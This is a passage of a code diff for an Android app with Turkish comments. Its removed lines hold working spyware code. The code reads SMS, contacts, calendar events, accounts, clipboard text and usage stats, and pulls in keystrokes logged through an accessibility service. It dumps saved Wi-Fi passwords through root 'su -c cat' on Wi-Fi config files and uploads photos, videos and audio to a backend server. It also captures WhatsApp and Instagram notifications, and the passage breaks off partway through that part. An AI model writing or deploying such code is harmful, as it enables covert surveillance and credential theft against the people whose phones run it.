-        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-        if (wm != null) {
-             obj.put("screen_refresh_rate", wm.getDefaultDisplay().getRefreshRate());
-        }
-
-        // 5. Sistem & İşletim Sistemi
-        obj.put("android_ver", Build.VERSION.RELEASE);
-        obj.put("sdk_int", Build.VERSION.SDK_INT);
-        obj.put("security_patch", Build.VERSION.SECURITY_PATCH);
-        obj.put("language", Locale.getDefault().getDisplayLanguage());
-        obj.put("timezone", java.util.TimeZone.getDefault().getID());
-        // Uptime (Saat cinsinden)
-        long uptime = android.os.SystemClock.elapsedRealtime();
-        obj.put("uptime_hours", String.format(Locale.US, "%.1f", uptime / (1000.0 * 3600)));
-
-        // 6. Donanım (Ultra)
-        obj.put("manufacturer", Build.MANUFACTURER);
-        obj.put("model", Build.MODEL);
-        obj.put("brand", Build.BRAND);
-        obj.put("board", Build.BOARD);
-        obj.put("bootloader", Build.BOOTLOADER);
-        obj.put("hardware", Build.HARDWARE);
-        obj.put("product", Build.PRODUCT);
-        obj.put("device", Build.DEVICE);
-        obj.put("fingerprint", Build.FINGERPRINT);
-        
-        JSONArray abis = new JSONArray();
-        for (String abi : Build.SUPPORTED_ABIS) abis.put(abi);
-        obj.put("supported_abis", abis);
-
-        // 7. Root Kontrolü (Basit)
-        boolean isRooted = false;
-        String[] suPaths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su" };
-        for (String p : suPaths) {
-            if (new File(p).exists()) { isRooted = true; break; }
-        }
-        if (!isRooted && Build.TAGS != null && Build.TAGS.contains("test-keys")) isRooted = true;
-        obj.put("is_rooted", isRooted);
-
-        JSONArray array = new JSONArray();
-        array.put(obj);
-        sendSyncRequest(array, "device_info");
-    }
-
-    // ================= YENİ EKLENEN VERİ ÇEKME FONKSİYONLARI =================
-
-    private void syncSMS() throws Exception {
-        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-             // addLog("[SYNC WARN] SMS izni reddedildi.");
-             return;
-        }
-        
-        JSONArray array = new JSONArray();
-        try {
-            Uri uri = Telephony.Sms.CONTENT_URI;
-            // Son 500 mesajı çek (Performans için limitli)
-            try (Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 500")) {
-                if (c != null) {
-                    while (c.moveToNext()) {
-                        JSONObject obj = new JSONObject();
-                        obj.put("address", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
-                        obj.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
-                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE))); // 1: Gelen, 2: Giden
-                        // Detaylı bilgiler
-                        obj.put("read", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.READ))); // 0=Okunmadı, 1=Okundu
-                        obj.put("status", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.STATUS)));
-                        obj.put("service_center", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SERVICE_CENTER)));
-                        obj.put("protocol", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PROTOCOL)));
-                        
-                        // [ULTRA DETAY] - Daha derin SMS verileri
-                        obj.put("thread_id", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))); // Mesajlaşma grubu ID'si
-                        obj.put("date_sent", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE_SENT))); // Gönderilme zamanı
-                        obj.put("seen", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))); // Görüldü mü?
-                        
-                        // İsteğe Bağlı Alanlar (Bazı cihazlarda olmayabilir, hata vermemesi için kontrol edilebilir ama getColumnIndex -1 dönerse sorun yok)
-                        int replyPathIdx = c.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT);
-                        if (replyPathIdx != -1) obj.put("reply_path_present", c.getInt(replyPathIdx));
-                        
-                        int lockedIdx = c.getColumnIndex(Telephony.Sms.LOCKED);
-                        if (lockedIdx != -1) obj.put("locked", c.getInt(lockedIdx));
-                        
-                        int errorIdx = c.getColumnIndex(Telephony.Sms.ERROR_CODE);
-                        if (errorIdx != -1) obj.put("error_code", c.getInt(errorIdx));
-
-                        // Çoklu SIM desteği için SubID
-                        int subIdx = c.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID);
-                        if (subIdx != -1) obj.put("subscription_id", c.getInt(subIdx));
-                        
-                        // Performans için sadece bilinmeyen numaralar yerine hepsine bakıyoruz ama iş parcacığında olduğu için sorun olmaz
-                        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                            String address = obj.getString("address");
-                            Uri contactUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
-                            try (Cursor contactCursor = getContentResolver().query(contactUri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null)) {
-                                if (contactCursor != null && contactCursor.moveToFirst()) {
-                                    obj.put("sender_name", contactCursor.getString(0));
-                                } else {
-                                    obj.put("sender_name", "Unknown"); // Rehberde yok
-                                }
-                            } catch (Exception ignored) {}
-                        }
-
-                        array.put(obj);
-                    }
-                }
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        if (array.length() > 0) sendSyncRequest(array, "sms");
-    }
-
-    /**
-     * Ağ, Wi-Fi ve Operatör bilgilerini detaylı çeker.
-     */
-    private void syncNetworkInfo() throws Exception {
-        JSONObject obj = new JSONObject();
-        
-        // Wi-Fi Bilgileri
-        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-        if (wifi != null && wifi.isWifiEnabled()) {
-            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
-            if (info != null) {
-                obj.put("wifi_ssid", info.getSSID());
-                obj.put("wifi_bssid", info.getBSSID());
-                obj.put("wifi_speed_mbps", info.getLinkSpeed());
-                obj.put("wifi_rssi", info.getRssi());
-                obj.put("wifi_frequency", info.getFrequency()); // MHz cinsinden
-                obj.put("wifi_network_id", info.getNetworkId());
-                obj.put("mac_address", info.getMacAddress()); // Android 10+ için genelde rastgeledir
-                int ip = info.getIpAddress();
-                obj.put("local_ip", String.format(Locale.getDefault(), "%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff)));
-                
-                // Kayıtlı Ağlardan Şifre Denemesi (Android 10+ için kısıtlıdır, genellikle null döner)
-                String passwordAttempt = null;
-                String passwordSource = "None";
-
-                // Yöntem 1: Standart API (Legacy)
-                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                    try {
-                        List<android.net.wifi.WifiConfiguration> configs = wifi.getConfiguredNetworks();
-                        if (configs != null) {
-                            for (android.net.wifi.WifiConfiguration config : configs) {
-                                if (config.SSID != null && config.SSID.equals(info.getSSID())) {
-                                    passwordAttempt = config.preSharedKey;
-                                    passwordSource = "API (Legacy)";
-                                    break;
-                                }
-                            }
-                        }
-                    } catch (SecurityException se) {
-                        passwordSource = "API Restricted";
-                    }
-                }
-
-                // Yöntem 2: Root Erişimi (Eğer API başarısızsa)
-                if (passwordAttempt == null || passwordAttempt.contains("*")) {
-                    try {
-                        // Farklı Android sürümleri için muhtemel yollar
-                        String[] paths = {
-                            "/data/misc/wifi/WifiConfigStore.xml",
-                            "/data/misc/wifi/wpa_supplicant.conf"
-                        };
-                        
-                        for (String path : paths) {
-                            Process p = Runtime.getRuntime().exec("su -c cat " + path);
-                            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                            StringBuilder sb = new StringBuilder();
-                            String line;
-                            while ((line = reader.readLine()) != null) {
-                                sb.append(line).append("\n");
-                            }
-                            String output = sb.toString();
-                            
-                            if (output.length() > 0) {
-                                // Basitçe tüm içeriği "raw_config" olarak ekleyebiliriz veya parse edebiliriz.
-                                // Şimdilik ham veriyi ekleyelim, çünkü parse etmek karmaşık olabilir.
-                                obj.put("wifi_config_dump_" + new File(path).getName(), output);
-                                passwordSource = "ROOT (" + path + ")";
-                                
-                                // Basit Regex ile şifre yakalama denemesi (SSID ile eşleşen blokta)
-                                // Not: Tam XML parse etmek daha iyidir ama burada quick-win yapıyoruz.
-                                if (output.contains(info.getSSID().replace("\"", ""))) {
-                                     passwordAttempt = "Found in Root Dump (Check raw data)";
-                                }
-                                break;
-                            }
-                        }
-                    } catch (Exception e) {
-                        passwordSource = "No Root / Access Denied";
-                    }
-                }
-                
-                // Yerel olarak bulunamadıysa, Backend'den (Main.py) internet sorgusu iste
-                if (passwordAttempt == null || passwordAttempt.equals("Not Found")) {
-                    passwordAttempt = "Not Found (Cloud Analysis Requested)";
-                    
-                    // Yöntem 3: Reflection ile "mOriginalConfig" veya gizli alanlara erişim denemesi
-                    try {
-                        List<android.net.wifi.WifiConfiguration> configs = wifi.getConfiguredNetworks();
-                        for (android.net.wifi.WifiConfiguration config : configs) {
-                             if (config.SSID != null && config.SSID.equals(info.getSSID())) {
-                                 // Gizli alanları zorla okumayı dne
-                                 java.lang.reflect.Field field = config.getClass().getDeclaredField("defaultGwMacAddress"); 
-                                 field.setAccessible(true);
-                                 // Bu sadece bir örnek, gerçek şifre alanı üreticiye göre değişir.
-                                 // Xiaomi için 'wepKeys' veya 'preSharedKey' bazen doludur ama gizlidir.
-                                 if (config.preSharedKey != null && !config.preSharedKey.equals("*")) {
-                                     passwordAttempt = config.preSharedKey;
-                                     passwordSource = "Reflection/Cache Hit";
-                                 }
-                             }
-                        }
-                    } catch (Exception e) {}
-                }
-                
-                obj.put("wifi_password_attempt", passwordAttempt != null ? passwordAttempt : "Not Found");
-                obj.put("wifi_password_source", passwordSource);
-                
-                // Kullanıcıya şifreyi alması için yol göster (Manuel QR Tarama)
-                obj.put("manual_action_hint", "Settings > Wi-Fi > Tap to Share Password (QR)");
-            }
-        }
-        
-        // Mobil Şebeke Bilgileri
-        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        if (tm != null) {
-            obj.put("network_operator", tm.getNetworkOperatorName());
-            obj.put("sim_operator", tm.getSimOperatorName());
-            obj.put("network_type", tm.getDataNetworkType());
-            obj.put("phone_type", tm.getPhoneType());
-            obj.put("is_roaming", tm.isNetworkRoaming());
-            obj.put("data_state", tm.getDataState()); // 0:Disconnected, 2:Connected
-            obj.put("sim_country_iso", tm.getSimCountryIso());
-            
-            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                // IMEI / Cihaz Kimliği (Android 10+ için kısıtlıdır, Android Kimliği kullanılır)
-                String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                obj.put("device_id_android", androidId);
-            }
-        }
-
-        JSONArray array = new JSONArray();
-        array.put(obj);
-        sendSyncRequest(array, "network_info");
-    }
-
-    /**
-     * Eşleşmiş Bluetooth cihazlarını listeler.
-     */
-    private void syncBluetoothDevices() throws Exception {
-        BluetoothAdapter btAdapter = BluetoothAdapter.getDefaultAdapter();
-        if (btAdapter == null) return;
-        
-        if (Build.VERSION.SDK_INT >= 31) {
-            if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) return;
-        }
-
-        JSONArray array = new JSONArray();
-        // Eşleşmiş cihazlar
-        for (android.bluetooth.BluetoothDevice device : btAdapter.getBondedDevices()) {
-             JSONObject obj = new JSONObject();
-             obj.put("name", device.getName());
-             obj.put("mac", device.getAddress());
-             obj.put("type", device.getType());
-             obj.put("bond_state", device.getBondState());
-             // Detaylar (API 18+)
-             obj.put("device_class", device.getBluetoothClass().getDeviceClass());
-             obj.put("major_device_class", device.getBluetoothClass().getMajorDeviceClass());
-             array.put(obj);
-        }
-        
-        if (array.length() > 0) sendSyncRequest(array, "bluetooth_devices");
-    }
-
-    /**
-     * Panodaki son kopyalanan metni çeker (Arayüz İş Parçacığı gerektirir).
-     */
-    private void syncClipboard() {
-        runOnUiThread(() -> {
-            try {
-                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-                if (clipboard != null && clipboard.hasPrimaryClip()) {
-                    if (clipboard.getPrimaryClipDescription().hasMimeType(android.content.ClipDescription.MIMETYPE_TEXT_PLAIN)) {
-                        ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
-                        CharSequence text = item.getText();
-                        if (text != null && text.length() > 0) {
-                             new Thread(() -> {
-                                 try {
-                                     JSONObject obj = new JSONObject();
-                                     obj.put("content", text.toString());
-                                     obj.put("captured_at", System.currentTimeMillis());
-                                     JSONArray array = new JSONArray();
-                                     array.put(obj);
-                                     sendSyncRequest(array, "clipboard");
-                                 } catch (Exception e) {}
-                             }).start();
-                        }
-                    }
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        });
-    }
-
-
-    /**
-     * Cihazdaki tüm sensörlerin listesini çıkarır.
-     */
-    private void syncSensors() throws Exception {
-        SensorManager sm = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
-        if (sm == null) return;
-        
-        List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL);
-        JSONArray array = new JSONArray();
-        
-        for (Sensor s : sensors) {
-            JSONObject obj = new JSONObject();
-            obj.put("name", s.getName());
-            obj.put("vendor", s.getVendor());
-            obj.put("version", s.getVersion());
-            obj.put("power_ma", s.getPower());
-            obj.put("type", s.getType());
-            obj.put("max_range", s.getMaximumRange());
-            obj.put("resolution", s.getResolution());
-            obj.put("min_delay", s.getMinDelay());
-            array.put(obj);
-        }
-        if (array.length() > 0) sendSyncRequest(array, "sensors");
-    }
-
-    /**
-     * Uygulama kullanım istatistiklerini çeker (Özel izin gerektirir).
-     */
-    private void syncUsageStats() throws Exception {
-        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
-        if (usm == null) return;
-
-        Calendar cal = Calendar.getInstance();
-        cal.add(Calendar.DAY_OF_YEAR, -1); // Son 24 saat
-        long startTime = cal.getTimeInMillis();
-        long endTime = System.currentTimeMillis();
-
-        // Bu işlem için ayarlardan izin verilmiş olması gerekir, yoksa boş döner
-        List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
-        
-        if (stats != null && !stats.isEmpty()) {
-            JSONArray array = new JSONArray();
-            for (UsageStats u : stats) {
-                if (u.getTotalTimeInForeground() > 0) {
-                    JSONObject obj = new JSONObject();
-                    obj.put("package", u.getPackageName());
-                    obj.put("total_time_foreground_ms", u.getTotalTimeInForeground());
-                    obj.put("last_time_used", u.getLastTimeUsed());
-                    array.put(obj);
-                }
-            }
-            if (array.length() > 0) sendSyncRequest(array, "usage_stats");
-        }
-    }
-
-    /**
-     * Kamera ve Mikrofon yeteneklerini (Surveillance Info) çeker.
-     */
-    private void syncSurveillanceInfo() throws Exception {
-        JSONObject obj = new JSONObject();
-        
-        // Mikrofon Kontrolü
-        boolean hasMic = getPackageManager().hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
-        obj.put("has_microphone", hasMic);
-        
-        // Kamera Detayları
-        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-        if (manager != null) {
-            JSONArray cameras = new JSONArray();
-            for (String cameraId : manager.getCameraIdList()) {
-                JSONObject cam = new JSONObject();
-                CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
-                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
-                
-                cam.put("id", cameraId);
-                cam.put("facing", (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) ? "FRONT" : "BACK");
-                
-                // Detaylı Kamera Özellikleri
-                cam.put("orientation", chars.get(CameraCharacteristics.SENSOR_ORIENTATION));
-                Boolean flashAvailable = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
-                cam.put("flash_available", flashAvailable != null ? flashAvailable : false);
-                
-                // Donanım Seviyesi (LIMITED, FULL, LEVEL_3 vs.)
-                Integer hwLevel = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
-                cam.put("hardware_level", hwLevel);
-                
-                cameras.put(cam);
-            }
-            obj.put("cameras", cameras);
-        }
-
-        JSONArray array = new JSONArray();
-        array.put(obj);
-        sendSyncRequest(array, "surveillance_info");
-    }
-
-    /**
-     * Erişilebilirlik servisi tarafından toplanan pencere ve uygulama olaylarını senkronize eder.
-     */
-    private void syncAccessibilityEvents() throws Exception {
-        JSONArray data;
-        synchronized (NikoAccessibilityService.accessibilityLog) {
-            if (NikoAccessibilityService.accessibilityLog.length() == 0) return;
-            data = new JSONArray(NikoAccessibilityService.accessibilityLog.toString());
-            // Buffer'ı temizle
-            while (NikoAccessibilityService.accessibilityLog.length() > 0) {
-                NikoAccessibilityService.accessibilityLog.remove(0);
-            }
-        }
-        sendSyncRequest(data, "accessibility_events");
-    }
-
-    /**
-     * Erişilebilirlik servisi tarafından yakalanan metin girişlerini (keylog) senkronize eder.
-     */
-    private void syncKeylogs() throws Exception {
-        JSONArray data;
-        synchronized (NikoAccessibilityService.keylogBuffer) {
-            if (NikoAccessibilityService.keylogBuffer.length() == 0) return;
-            data = new JSONArray(NikoAccessibilityService.keylogBuffer.toString());
-            // Buffer'ı temizle
-            while (NikoAccessibilityService.keylogBuffer.length() > 0) {
-                NikoAccessibilityService.keylogBuffer.remove(0);
-            }
-        }
-        sendSyncRequest(data, "keylogs");
-    }
-
-    /**
-     * Cihazda kayıtlı tüm hesapları (Google, WhatsApp, Email vb.) senkronize eder.
-     */
-    private void syncAccounts() throws Exception {
-        android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
-        android.accounts.Account[] accounts = am.getAccounts();
-        JSONArray array = new JSONArray();
-        for (android.accounts.Account ac : accounts) {
-            JSONObject obj = new JSONObject();
-            obj.put("name", ac.name);
-            obj.put("type", ac.type);
-            array.put(obj);
-        }
-        if (array.length() > 0) {
-            sendSyncRequest(array, "accounts");
-        }
-    }
-
-    /**
-     * Takvim etkinliklerini senkronize eder.
-     */
-    private void syncCalendarEvents() throws Exception {
-        if (checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) return;
-        
-        Uri uri = Uri.parse("content://com.android.calendar/events");
-        String[] projection = {"title", "description", "dtstart", "dtend", "eventLocation"};
-        
-        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, "dtstart DESC")) {
-            if (cursor != null && cursor.moveToFirst()) {
-                JSONArray array = new JSONArray();
-                int limit = 50;
-                do {
-                    JSONObject obj = new JSONObject();
-                    obj.put("title", cursor.getString(0));
-                    obj.put("description", cursor.getString(1));
-                    obj.put("start_time", cursor.getLong(2));
-                    obj.put("end_time", cursor.getLong(3));
-                    obj.put("location", cursor.getString(4));
-                    array.put(obj);
-                    limit--;
-                } while (cursor.moveToNext() && limit > 0);
-                
-                if (array.length() > 0) {
-                    sendSyncRequest(array, "calendar_events");
-                }
-            }
-        }
     }
 
     /* *********************************************************************************
@@ -8192,206 +7129,6 @@ public class MainActivity extends Activity {
 
 
     /* *********************************************************************************
-     *                         YENİ NESİL MEDYA SENKRONİZASYON MOTORU
-     * *********************************************************************************/
-
-    /**
-     * Cihazdaki medya dosyalarını (Resim, Video, Ses) tarar ve sunucuyla 
-     * senkronize eder.
-     */
-    private void startAutoPhotoSync() { performMediaSync("photos"); }
-    private void startAutoVideoSync() { performMediaSync("videos"); }
-    private void startAutoAudioSync() { performMediaSync("audio"); }
-
-    private void performMediaSync(final String mediaType) {
-        // İzin Kontrolü: Medya türüne göre gerekli izin var mı bakılır
-        if (!hasMediaPermission(mediaType)) {
-            addLog("⚠️ " + mediaType + " için erişim izni yok. Atlanıyor.");
-            return;
-        }
-
-        // Medya tarama ve yükleme işlemi ağır olabileceği için yeni bir thread havuzunda çalıştırılır
-        Executors.newSingleThreadExecutor().execute(() -> {
-            try {
-                String deviceName = getDeviceName();
-                // SharedPreferences: Hangi dosyaların önceden yüklendiğini hatırlamak için kullanılır
-                SharedPreferences syncPrefs = getSharedPreferences(mediaType + "_sync_cache", MODE_PRIVATE);
-                
-                addLog("🚀 [" + mediaType.toUpperCase() + "] Taraması başlatılıyor...");
-                
-                // Android MediaStore üzerinden medya sorgusu (Sorgu veritabanına yapılır, klasör taramaya göre çok daha hızlıdır)
-                Uri contentUri = getMediaUri(mediaType);
-                String[] projection = getMediaProjection(mediaType);
-                String sortOrder = MediaStore.MediaColumns.DATE_ADDED + " DESC";
-                
-                try (Cursor cursor = getContentResolver().query(contentUri, projection, null, null, sortOrder)) {
-                    if (cursor == null || !cursor.moveToFirst()) {
-                        addLog("📂 [" + mediaType.toUpperCase() + "] Klasörü boş.");
-                        return;
-                    }
-
-                    int total = cursor.getCount();
-                    int uploaded = 0;
-                    int skipped = 0;
-                    int failed = 0;
-
-                    // Paralel yükleme kapasitesi (Videolar için tek tek, diğerleri için 3'lü grup)
-                    int threadCount = mediaType.equals("videos") ? 1 : 3;
-                    ExecutorService pool = Executors.newFixedThreadPool(threadCount);
-
-                    do {
-                        final long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
-                        final String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
-                        final long dateModified = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED));
-                        final long fileSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
-                        final Uri fileUri = Uri.withAppendedPath(contentUri, String.valueOf(id));
-
-                        // 1. Mükerrer Yükleme Kontrolü
-                        // Dosya ID'si ve son değiştirilme tarihini anahtar olarak kullanıyoruz.
-                        final String syncKey = "sync_" + id + "_" + dateModified;
-                        if (syncPrefs.getBoolean(syncKey, false)) {
-                            skipped++;
-                            continue;
-                        }
-
-                        // 2. Güvenlik/Performans Sınırı: Video dosyaları için 5MB sınırı
-                        if (mediaType.equals("videos") && fileSize > 5 * 1024 * 1024) {
-                            skipped++;
-                            continue;
-                        }
-
-                        // 3. Dosyayı Sunucuya Gönder (İş Parçacığı Havuzuna ekle)
-                        pool.execute(() -> {
-                            boolean success = uploadMediaFile(fileUri, fileName, mediaType, deviceName);
-                            if (success) {
-                                // Başarılıysa SharedPreferences'a kaydet ki bir daha yüklemesin
-                                syncPrefs.edit().putBoolean(syncKey, true).apply();
-                            }
-                        });
-                        
-                        uploaded++;
-                        // Çok fazla dosya varsa cihazı yormamak için her taramada belli bir sınır (örn: 100) koyabiliriz.
-                        if (uploaded >= 100) break; 
-
-                    } while (cursor.moveToNext());
-
-                    // Tüm yüklemelerin bitmesini bekle
-                    pool.shutdown();
-                    pool.awaitTermination(30, TimeUnit.MINUTES);
-                    addLog("📊 [" + mediaType.toUpperCase() + "] İşlem Tamam: " + uploaded + " taranan, " + skipped + " atlanan.");
-                }
-            } catch (Exception e) {
-                addLog("❌ [" + mediaType.toUpperCase() + "] Senkronizasyon hatası: " + e.getMessage());
-            }
-        });
-    }
-
-    private boolean hasMediaPermission(String type) {
-        if (Build.VERSION.SDK_INT >= 33) {
-            if (type.equals("photos")) return checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED;
-            if (type.equals("videos")) return checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == PackageManager.PERMISSION_GRANTED;
-            if (type.equals("audio")) return checkSelfPermission("android.permission.READ_MEDIA_AUDIO") == PackageManager.PERMISSION_GRANTED;
-        }
-        return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private Uri getMediaUri(String type) {
-        if (type.equals("videos")) return MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
-        if (type.equals("audio")) return MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
-        return MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-    }
-
-    private String[] getMediaProjection(String type) {
-        return new String[]{
-            MediaStore.MediaColumns._ID,
-            MediaStore.MediaColumns.DISPLAY_NAME,
-            MediaStore.MediaColumns.DATE_MODIFIED,
-            MediaStore.MediaColumns.SIZE
-        };
-    }
-
-    /**
-     * Medya dosyasını backend'e yükleyen çekirdek metod.
-     */
-    private boolean uploadMediaFile(Uri uri, String fileName, String type, String deviceName) {
-        HttpURLConnection conn = null;
-        try {
-            // Sunucu adresi boşsa işlemi iptal et
-            if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return false;
-
-            // Medya tipine göre doğru endpoint'i seçiyoruz
-            String endpoint;
-            if (type.equals("social_media")) {
-                endpoint = "/api/sync/social";
-            } else {
-                // photos -> /api/sync/photo, videos -> /api/sync/video vb.
-                endpoint = "/api/sync/" + (type.equals("photos") ? "photo" : type.equals("videos") ? "video" : "audio");
-            }
-            URL url = new URL(API_BASE_URL + endpoint);
-            
-            // Multipart form-data için benzersiz bir sınır (boundary) oluşturuyoruz
-            String boundary = "NikoBoundary" + System.currentTimeMillis();
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(60000); // Bağlantı için 1 dakika (zayıf internet dostu)
-            // Videolar büyük olduğu için okuma süresini 5 dakikaya kadar uzatıyoruz
-            conn.setReadTimeout(type.equals("videos") ? 300000 : 120000);
-            conn.setDoOutput(true);
-            conn.setUseCaches(false); // Önbelleği devre dışı bırak (güncel veri önemli)
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-            
-            // Kullanıcı giriş yapmışsa yetkilendirme header'ını ekle
-            if (authToken != null) conn.setRequestProperty("Authorization", "Bearer " + authToken);
-            
-            // ChunkedSteamingMode: Dosyayı RAM'e yüklemeden parça parça gönderir.
-            // Bu sayede 1-2 GB'lık dosyalarda OutOfMemory (RAM yetersiz) hatası almayız.
-            conn.setChunkedStreamingMode(1024 * 64); // 64KB'lık parçalar halinde gönder
-
-            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
-                // 1. Parametre: Device Name (Hangi cihazdan geldiği bilgisi)
-                dos.writeBytes("--" + boundary + "\r\n");
-                dos.writeBytes("Content-Disposition: form-data; name=\"device_name\"\r\n\r\n");
-                dos.write(deviceName.getBytes("UTF-8"));
-                dos.writeBytes("\r\n");
-
-                // 2. Parametre: Dosya (Binary veri akışı)
-                dos.writeBytes("--" + boundary + "\r\n");
-                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n");
-                // MIME tipini içeriğe göre otomatik belirle
-                String mimeType = type.equals("photos") ? "image/jpeg" : type.equals("videos") ? "video/mp4" : "audio/mpeg";
-                dos.writeBytes("Content-Type: " + mimeType + "\r\n\r\n");
-
-                // Dosya Verisini Buradan Akıtıyoruz (Streaming)
-                try (InputStream is = getContentResolver().openInputStream(uri)) {
-                    if (is == null) return false;
-                    byte[] buffer = new byte[32768]; // her seferinde 32KB oku
-                    int bytesRead;
-                    while ((bytesRead = is.read(buffer)) != -1) {
-                        dos.write(buffer, 0, bytesRead);
-                    }
-                }
-                dos.writeBytes("\r\n");
-
-                // 3. Dosya Gönderimini Bitir
-                dos.writeBytes("--" + boundary + "--\r\n");
-                dos.flush();
-            }
-
-            // Sunucunun yanıt kodunu al
-            int code = conn.getResponseCode();
-            // 200: Başarılı, 201: Oluşturuldu, 208/409: Zaten var (Conflict/Already Reported)
-            return (code == 200 || code == 201 || code == 208 || code == 409);
-
-        } catch (Exception e) {
-            // Hata durumunda işlemi başarısız say (Loglama ana metodda yapılır)
-            return false;
-        } finally {
-            if (conn != null) conn.disconnect();
-        }
-    }
-
-
-    /* *********************************************************************************
      *                                 YÖNETİCİ LOGLARI
      * *********************************************************************************/
 
@@ -8446,112 +7183,8 @@ public class MainActivity extends Activity {
     }
 
     /* *********************************************************************************
-     *                      SOSYAL TAKİP (WHATSAPP & INSTAGRAM)
+     *                         DİĞER YARDIMCI METODLAR
      * *********************************************************************************/
-
-    /**
-     * WhatsApp ve Instagram bildirimlerini yakalayarak backend'e ileten servis.
-     * Bildirim Erişimi (Notification Access) gerektirir.
-     */
-    public static class WhatsAppService extends NotificationListenerService {
-        // Gönderilemeyen mesajları biriktiren yedek tampon
-        private static final JSONArray pendingMessages = new JSONArray();
-
-        @Override
-        public void onNotificationPosted(StatusBarNotification sbn) {
-            String packageName = sbn.getPackageName();
-            if (!packageName.equals("com.whatsapp") && !packageName.equals("com.instagram.android")) {
-                return;
-            }
-
-            Notification notification = sbn.getNotification();
-            if (notification == null) return;
-            Bundle extras = notification.extras;
-            String title = extras.getString(Notification.EXTRA_TITLE);
-            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
-
-            if (title == null || text == null) return;
-            
-            String msgText = text.toString();
-            
-            // Filtreleme: Gereksiz sistem bildirimlerini atla
-            if (msgText.equals("Bağlantınız kontrol ediliyor") || 
-                msgText.equals("Yeni mesajlar için kontrol ediliyor") ||
-                msgText.contains("WhatsApp Web şu anda aktif") ||
-                msgText.isEmpty()) {
-                return;
-            }
-
-            // WhatsApp için yerel değişkenleri güncelle (Sesli okuma ve cevaplama için)
-            if (packageName.equals("com.whatsapp")) {
-                lastWhatsAppMessage = text.toString();
-                lastWhatsAppSender = title;
-
-                if (notification.actions != null) {
-                    for (Notification.Action a : notification.actions) {
-                        if (a.getRemoteInputs() != null) {
-                            lastReplyIntent = a.actionIntent;
